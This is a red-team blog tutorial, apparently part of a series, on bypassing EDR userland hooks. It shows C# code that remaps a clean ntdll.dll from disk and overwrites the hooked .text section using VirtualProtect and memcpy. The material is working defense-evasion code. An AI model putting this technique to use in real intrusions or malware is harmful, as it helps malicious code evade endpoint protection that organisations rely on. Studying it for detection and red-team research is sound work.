---
title: "Staying Under the Radar - Part 3 - Unhooking DLLs"
author:
  name: crypt0ace
  link: https://twitter.com/crypt0acee
date: 2022-09-24
description: "Unhooking DLLS in C#"
tags: [Red Team]
---
## Introduction
In this post we will look into how we can manually unhook DLLs that are attached by the EDRs. We can do this by swiping out the hooked version of `ntdll.dll`, the DLL to which all the function calls are eventually passed on before the syscall is made, with a new clean version.

## Endpoint Detection and Response
EDRs or Endpoint Detection and Response are security solutions that organizations deploy to protect their infrastructure from malicious attacks by detecting them and responding to them. According to CrowdStrike, *Using EDR, the threat hunters work proactively to hunt, investigate and advise on threat activity in your environment. When they find a threat, they work alongside your team to triage, investigate and remediate the incident, before it has the chance to become a full-blown breach.*

## Userland Hooks
A usual way EDRs detect behaviour of a program is by the process of _hooking_. What this means is that the EDRs will inject into a running process and monitor the use of API calls. Some of these API calls are considered malicious due to high usage of them in malicious programs. They can be *VirtualAlloc*, *QueueUserAPC*, *CreateRemoteThread*, etc.
<br>
An example of this has previously been discussed in [Part 1](https://crypt0ace.github.io/posts/Staying-under-the-Radar/) where we saw how BitDefender hooked into our process to look for malicious activity.

## Identifying Hooks
We can identify hooks if we follow execution of a process in a debugger. For this demonstration, I'm using x64Dbg. Once we load a program in the debugger we can go over to symbols and look for `ntdll.dll`. Clicking on it should give us a list of exports it has. This will contain a list of APIs that we can look.
<br>
![API Calls from NTDLL](/assets/img/staying-under-the-radar-3/functions.png)
<br>
In this demonstration I will be using `NtCreateProcess`. We can find it in the list and then double click it to see it in disassembler. We can observe a `JMP` instruction happening. That `JMP` instruction would take us the the DLL of BitDefender.
<br>
![BitDefender Hook](/assets/img/staying-under-the-radar-3/with-edr.png)
<br>
In comparison, if we look at this the same way from a machine that does not have BitDefender we see that the `JMP` instruction is not present anymore.
<br>
![No Hooks](/assets/img/staying-under-the-radar-3/without-edr.png)
<br>

## Unhooking
### Imports
We can start with importing some API calls that we would need to do this. There's a number of API calls all mentioned below and taken from Microsoft Docs and PInvoke.
```csharp
[DllImport("psapi.dll", SetLastError = true)]
public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentProcess();

[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, PageProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

[DllImport("kernel32.dll")]
public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, FileMapAccessType dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);

[DllImport("kernel32.dll")]
public static extern int VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

[DllImport("msvcrt.dll", SetLastError = false)]
public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UInt32 count);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool CloseHandle(IntPtr hObject);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool FreeLibrary(IntPtr hModule);
```

We also need some structs but instead of pasting all of them here you can visit the github [here](https://github.com/crypt0ace/CS-Unhook) to look at all the code.

### Main Method
First we need to get the current process's handle. We can get that using `GetCurrentProcess` API.
```csharp
IntPtr currentProcessHandle = GetCurrentProcess();
```

Then we can initialize `MODULEINFO`. We need to get a handle to the `NTDLL.dll` that is currently loaded and is being hooked by BitDefender. We can use `GetModuleHhandle` for this. Next we need to use `GetModuleInformation` with the current process handle and the DLL Handle to retrieve the information from `MODULEINFO` struct. This information will be `lpBaseOfDll` to get the base address of `NTDLL.dll`
```csharp
MODULEINFO modInfo = new MODULEINFO();
IntPtr dllHandle = GetModuleHandle("ntdll.dll");
GetModuleInformation(currentProcessHandle, dllHandle, out modInfo, (uint)Marshal.SizeOf(modInfo));
IntPtr dllBase = modInfo.lpBaseOfDll;
```

After this we can start mapping a fresh copy of `NTDLL.dll` from disk. First we will get a handle of the fresh `NTDLL.dll` using `CreateFileA` with read access. Next we are going to use `CreateFileMapping` to create mapping of the specified DLL. Then we can map the DLL into memory using `MapViewOfFile` providing it the mapping and opening it with read access.
```csharp
string fileName = "C:\\Windows\\System32\\ntdll.dll";
IntPtr ntdllHandle = CreateFileA(ntdll, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
IntPtr ntdllMapping = CreateFileMapping(ntdllHandle, IntPtr.Zero, PageProtection.Readonly | PageProtection.SectionImage, 0, 0, null);
IntPtr ntdllMmapped = MapViewOfFile(ntdllMapping, FileMapAccessType.Read, 0, 0, IntPtr.Zero);
```

Next we get a pointer to the DOS Header from the DLL Base Address using `Marshal.PtrToStructure`. We can get a pointer to the NT Header structure by adding the Base Address of the DLL to `e_lfanew` which is a pointer to PE Header.
```csharp
IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
IntPtr ptrtoNTHeader = (dllBase + dosHeader.e_lfanew);
IMAGE_NT_HEADERS64 ntHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrtoNTHeader, typeof(IMAGE_NT_HEADERS64));
```

After getting these values we can now check the sections. The section that we are interested in is the `.text` section because thats the one that holds all the executeable code. This also where our DLL will reside. So to overwrite the old DLL with our new DLL we are going to loop through the section names and try to find the `.text` one.
<br>
The number of sections are retrieved by using `ntHeader.FileHeader.NumberOfSections`. We need to locate the Section Header so we can retreive the names of the sections. We need to loop through all the sections and get a pointer to the Section Header. That way we can easily call the name of the sections using `sectionHeader.Name`.
```csharp
for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; i++)
{
  IntPtr ptrtoSectionHeader = (ptrtoNTHeader + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
  IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrtoSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER));
  string sectionName = new string(sectionHeader.Name);
  Console.WriteLine(sectionName);
}
```

Now we need to use a for loop as if the section name contains `.text`, we can proceed with the code. We start by using `IntPtr.Add` to add the offset of the first byte of the section to the DLL Base Address. This will be the old hooked DLL address. Then we are going to do the same with the new DLL that we have mapped as well.
<br>
After this the actual change happens. We are going to use `VirtualProtect` to change the protection of the `.text` section to RWX. Then we use `memcpy` to overwrite the old DLL with the new one. And then change the protection back.
```csharp
if (sectionName.Contains(".text"))
{
  uint oldProtect = 0;
  IntPtr oldAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
  IntPtr newAddress = IntPtr.Add(ntdllMmapped, (int)sectionHeader.VirtualAddress);
  int vProtect = VirtualProtect(oldAddress, sectionHeader.VirtualSize, 0x40, out oldProtect);
  memcpy(oldAddress, newAddress, sectionHeader.VirtualSize);
  vProtect = VirtualProtect(oldAddress, sectionHeader.VirtualSize, oldProtect, out oldProtect);
}
```

When this is done, the function should be able to swipe the hooked DLL with a new fresh one which is not hooked.
![Clean NTDLL](/assets/img/staying-under-the-radar-3/after-unhooking.png)

## Code
The code can be found on my github [here](https://github.com/crypt0ace/CS-Unhook).

## Conclusion
As always this code is not perfect. EDRs or AVs might catch and burn this as soon as it hits the disk. EDRs and AVs are constantly updating and getting better at what they do so as everyone always says _Its just a game of cat and mouse_.

## References
All credits to these posts and codes

- [DLL Unhooking C# - MakosecBlog](https://makosecblog.com/malware-dev/dll-unhooking-csharp/)
- [Full DLL Unhooking - Kara-4search](https://github.com/Kara-4search/FullDLLUnhooking_CSharp/blob/main/FullDLLUnhooking/Program.cs)
- [SharpUnhooker - GetRektBoy724](https://github.com/GetRektBoy724/SharpUnhooker)
- [Classic API Unhooking to Bypass EDR Solutions - DepthSecurity](https://depthsecurity.com/blog/classic-api-unhooking-to-bypass-edr-solutions)